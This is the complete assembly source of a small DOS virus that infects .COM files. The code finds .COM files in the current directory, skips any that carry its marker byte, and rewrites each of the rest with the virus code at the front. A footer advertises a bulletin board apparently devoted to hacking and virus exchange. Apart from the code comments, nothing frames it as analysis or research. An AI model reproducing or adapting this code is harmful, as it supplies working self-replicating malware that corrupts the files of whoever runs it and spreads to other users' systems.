tic             segment
                org     100h
                assume  cs:tic, ds:tic, es:tic
;
len     equ     offset last-100h        ;LENGTH OF VIRUS CODE
;
start:          mov     bx,0fh          ;KLUDGE TO AVOID MEMALLOC ERROR
                mov     ah,4ah
                int     21h
                mov     dx,es
                add     dh,10h
                mov     es,dx           ;PROGRAM CODE WILL RUN HERE
                push    dx              ;SET UP FOR FAR RETURN
                push    si
                mov     ah,26h          ;CREATE NEW PSP
                int     21h
                mov     di,si
                mov     si,offset last
                push    si
                mov     ch,0feh
                rep     movsb           ;MOVE PROGRAM CODE UP
                dec     cx              ;=FFFF
                pop     di
                mov     dx,offset file
                mov     ah,4eh          ;FIND FIRST .COM FILE
                jmp     short find
retry:          mov     ah,4fh          ;FIND NEXT
find:           int     21h
                jc      nofile          ;NO (MORE) FILES
                mov     dx,9eh          ;FILE NAME IN DTA
                mov     ax,3d02h        ;OPEN FILE
                int     21h
                xchg    ax,bx           ;1-BYTE MOVE OF AXBX
                mov     dx,di           ;END OF VIRUS CODE
                mov     ah,3fh          ;READ FILE DATA (CX=FFFF)
                int     21h             ;READ FILE AFTER VIRUS CODE
                add     ax,len          ;LENGTH OF VIRUS+FILE
                cmp     byte ptr [di],0bbh    ;CHECK IF ALREADY INFECTED
                je      retry           ;TRY AGAIN
                push    ax
                xor     cx,cx
                mov     ax,4200h        ;RESET FILE POINTER
                cwd                     ;DX=0
                int     21h
                pop     cx
                mov     dh,1
                mov     ah,40h          ;WRITE INFECTED CODE BACK
                int     21h
;
nofile:         push    es              ;GO RUN PROGRAM
                pop     ds
                retf
;
file    db      '*.COM',0               ;SEARCH FOR .COM FILES
last    db      0c3h                    ;STANDALONE VIRUS CODE JUST RETURNS
tic             ends
                end     start

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
; 컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

